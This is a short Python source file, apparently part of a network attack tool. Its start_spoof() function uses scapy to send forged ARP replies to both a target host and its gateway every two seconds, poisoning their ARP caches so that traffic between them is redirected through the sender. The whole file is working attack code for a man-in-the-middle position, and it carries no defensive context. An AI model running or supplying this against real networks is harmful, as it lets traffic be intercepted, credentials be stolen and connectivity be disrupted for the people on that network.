import time
import logger
import scapy.layers.l2
import scapy.sendrecv
import utils


def start_spoof(target_ip, gateway_ip, interface):
    """Continuously send ARP spoofing packets."""
    # Get MAC addresses
    target_mac = utils.get_mac(target_ip)
    gateway_mac = utils.get_mac(gateway_ip)

    # Check if MAC addresses are valid
    if not target_mac or not gateway_mac:
        logger.logging.error("Failed to get target or gateway MAC address. Check network connection.")
        return

    logger.logging.info(f"Target MAC: {target_mac}, Gateway MAC: {gateway_mac}")
    logger.logging.info("Starting ARP spoofing...")

    try:
        while True:
            # Prepare ARP packet to spoof the target host
            arp_target = scapy.layers.l2.ARP(
                op=2,  # ARP reply
                pdst=target_ip,  # Target IP
                hwdst=target_mac,  # Target MAC
                psrc=gateway_ip  # Spoofed source IP (gateway)
            )
            # Send ARP packet to the target host
            scapy.sendrecv.send(arp_target, iface=interface, verbose=False)

            # Prepare ARP packet to spoof the gateway
            arp_gateway = scapy.layers.l2.ARP(
                op=2,  # ARP reply
                pdst=gateway_ip,  # Gateway IP
                hwdst=gateway_mac,  # Gateway MAC
                psrc=target_ip  # Spoofed source IP (target)
            )
            # Send ARP packet to the gateway
            scapy.sendrecv.send(arp_gateway, iface=interface, verbose=False)

            # Wait for 2 seconds before sending the next ARP packets
            time.sleep(2)
    except KeyboardInterrupt:
        logger.logging.info("ARP spoofing stopped")